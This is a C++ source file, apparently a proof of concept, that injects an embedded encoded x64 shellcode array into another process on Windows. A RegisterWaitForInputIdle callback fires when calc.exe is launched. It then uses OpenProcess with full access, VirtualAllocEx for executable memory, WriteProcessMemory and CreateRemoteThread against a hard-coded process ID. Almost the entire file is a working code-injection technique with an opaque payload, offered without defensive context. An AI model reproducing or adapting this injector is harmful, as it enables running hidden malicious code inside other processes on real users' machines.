//Author : Navneet & ElementalX

#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <TlHelp32.h>


unsigned char shellcode[] =
"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\x0d\xb5\x4c\xe3\x8c\xeb\x24\xb7\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xf1\xfd\xcf"
"\x07\x7c\x03\xe4\xb7\x0d\xb5\x0d\xb2\xcd\xbb\x76\xe6\x5b"
"\xfd\x7d\x31\xe9\xa3\xaf\xe5\x6d\xfd\xc7\xb1\x94\xa3\xaf"
"\xe5\x2d\xfd\xc7\x91\xdc\xa3\x2b\x00\x47\xff\x01\xd2\x45"
"\xa3\x15\x77\xa1\x89\x2d\x9f\x8e\xc7\x04\xf6\xcc\x7c\x41"
"\xa2\x8d\x2a\xc6\x5a\x5f\xf4\x1d\xab\x07\xb9\x04\x3c\x4f"
"\x89\x04\xe2\x5c\x60\xa4\x3f\x0d\xb5\x4c\xab\x09\x2b\x50"
"\xd0\x45\xb4\x9c\xb3\x07\xa3\x3c\xf3\x86\xf5\x6c\xaa\x8d"
"\x3b\xc7\xe1\x45\x4a\x85\xa2\x07\xdf\xac\xff\x0c\x63\x01"
"\xd2\x45\xa3\x15\x77\xa1\xf4\x8d\x2a\x81\xaa\x25\x76\x35"
"\x55\x39\x12\xc0\xe8\x68\x93\x05\xf0\x75\x32\xf9\x33\x7c"
"\xf3\x86\xf5\x68\xaa\x8d\x3b\x42\xf6\x86\xb9\x04\xa7\x07"
"\xab\x38\xfe\x0c\x65\x0d\x68\x88\x63\x6c\xb6\xdd\xf4\x14"
"\xa2\xd4\xb5\x7d\xed\x4c\xed\x0d\xba\xcd\xb1\x6c\x34\xe1"
"\x95\x0d\xb1\x73\x0b\x7c\xf6\x54\xef\x04\x68\x9e\x02\x73"
"\x48\xf2\x4a\x11\xaa\x32\x9c\x57\x85\x52\x86\x7e\xe3\x8c"
"\xaa\x72\xfe\x84\x53\x04\x62\x60\x4b\x25\xb7\x0d\xfc\xc5"
"\x06\xc5\x57\x26\xb7\x0c\x0e\x8c\x4b\x8d\xec\x65\xe3\x44"
"\x3c\xa8\xaf\x05\x1a\x65\x0d\x41\xc2\x6a\xe4\x73\x3e\x68"
"\x3e\xe7\xdd\x4d\xe2\x8c\xeb\x7d\xf6\xb7\x9c\xcc\x88\x8c"
"\x14\xf1\xe7\x5d\xf8\x7d\x2a\xc1\xda\xe4\xff\xf2\x75\x04"
"\x6a\x4e\xa3\xdb\x77\x45\x3c\x8d\xa2\x36\x01\x2b\x68\xed"
"\x4a\x99\xab\x05\x2c\x4e\xa7\x4c\xed\x00\x6a\x6e\xa3\xad"
"\x4e\x4c\x0f\xd5\x46\xf8\x8a\xdb\x62\x45\x34\x88\xa3\x8e"
"\xeb\x24\xfe\xb5\xd6\x21\x87\x8c\xeb\x24\xb7\x0d\xf4\x1c"
"\xa2\xdc\xa3\xad\x55\x5a\xe2\x1b\xae\xbd\x2b\x4e\xba\x54"
"\xf4\x1c\x01\x70\x8d\xe3\xf3\x29\xe1\x4d\xe2\xc4\x66\x60"
"\x93\x15\x73\x4c\x8b\xc4\x62\xc2\xe1\x5d\xf4\x1c\xa2\xdc"
"\xaa\x74\xfe\xf2\x75\x0d\xb3\xc5\x14\xec\xfa\x84\x74\x00"
"\x6a\x4d\xaa\x9e\xce\xc1\x8a\xca\x1c\x59\xa3\x15\x65\x45"
"\x4a\x86\x68\x82\xaa\x9e\xbf\x8a\xa8\x2c\x1c\x59\x50\xd4"
"\x02\xaf\xe3\x0d\x59\x2a\x7e\x99\x2a\xf2\x60\x04\x60\x48"
"\xc3\x18\xb1\x71\xbf\xcc\x18\x6c\x9e\x21\x0c\x4a\xa6\x3e"
"\x8c\xe6\xeb\x7d\xf6\x84\x6f\xb3\x36\x8c\xeb\x24\xb7";





DWORD MyWaitForInputIdleRoutine(HANDLE hProcess, DWORD dwMilliseconds)
{

    HANDLE _OpenProcess{};
    HANDLE _CreateRemoteThread{};
    PVOID threadrourtineshellcoderun;
    DWORD processID = 18532;
    PROCESSENTRY32 pe{};
    ZeroMemory(&pe, sizeof(pe));
    pe.dwSize = sizeof(PROCESSENTRY32);


    _OpenProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processID);

    LPVOID lpRemoteAddress = VirtualAllocEx(_OpenProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpRemoteAddress == NULL)
    {
        std::cerr << "Failed to allocate memory in remote process" << std::endl;
        return GetLastError();
    }


    if (!WriteProcessMemory(_OpenProcess, lpRemoteAddress, shellcode, sizeof(shellcode), NULL))
    {
        std::cerr << "Failed to write shellcode to remote process memory" << std::endl;
        VirtualFreeEx(hProcess, lpRemoteAddress, 0, MEM_RELEASE);
        return GetLastError();
    }




    HANDLE hRemoteThread = CreateRemoteThread(_OpenProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteAddress, NULL, 0, NULL);
    if (hRemoteThread == NULL)
    {
        std::cerr << "Failed to create remote thread" << std::endl;
        VirtualFreeEx(hProcess, lpRemoteAddress, 0, MEM_RELEASE);
        return GetLastError();
    }

    if (hRemoteThread) {

        MessageBoxA(NULL, "Shellcode injected using RegisterWaitForInputIdle", "ACHIVED", MB_OK);
    }


    WaitForSingleObject(hRemoteThread, INFINITE);


    VirtualFreeEx(hProcess, lpRemoteAddress, 0, MEM_RELEASE);
    CloseHandle(hRemoteThread);

    return 0;
}


typedef DWORD(WINAPI* WaitForInputIdleType)(HANDLE, DWORD);


WaitForInputIdleType UserWaitForInputIdleRoutine = NULL;


VOID WINAPI RegisterWaitForInputIdle(WaitForInputIdleType lpfnRegisterWaitForInputIdle)
{
    UserWaitForInputIdleRoutine = lpfnRegisterWaitForInputIdle;
}


UINT WINAPI MyWinExec(LPCSTR lpCmdLine, UINT uCmdShow)
{
    STARTUPINFOA StartupInfo;
    PROCESS_INFORMATION ProcessInformation;
    DWORD dosErr;

    RtlZeroMemory(&StartupInfo, sizeof(StartupInfo));
    StartupInfo.cb = sizeof(STARTUPINFOA);
    StartupInfo.wShowWindow = (WORD)uCmdShow;
    StartupInfo.dwFlags = 0;

    if (!CreateProcessA(NULL,
        (LPSTR)lpCmdLine,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &StartupInfo,
        &ProcessInformation))
    {
        dosErr = GetLastError();
        return dosErr < 32 ? dosErr : ERROR_BAD_FORMAT;
    }

    if (NULL != UserWaitForInputIdleRoutine)
    {

        UserWaitForInputIdleRoutine(ProcessInformation.hProcess, 10000);
    }

    CloseHandle(ProcessInformation.hProcess);
    CloseHandle(ProcessInformation.hThread);

    return 33;
}

int main()
{

    RegisterWaitForInputIdle(MyWaitForInputIdleRoutine);


    UINT result = MyWinExec("C:\\Windows\\System32\\calc.exe", SW_SHOWNORMAL);

    std::cout << "WinExec returned: " << result << std::endl;

    return 0;
}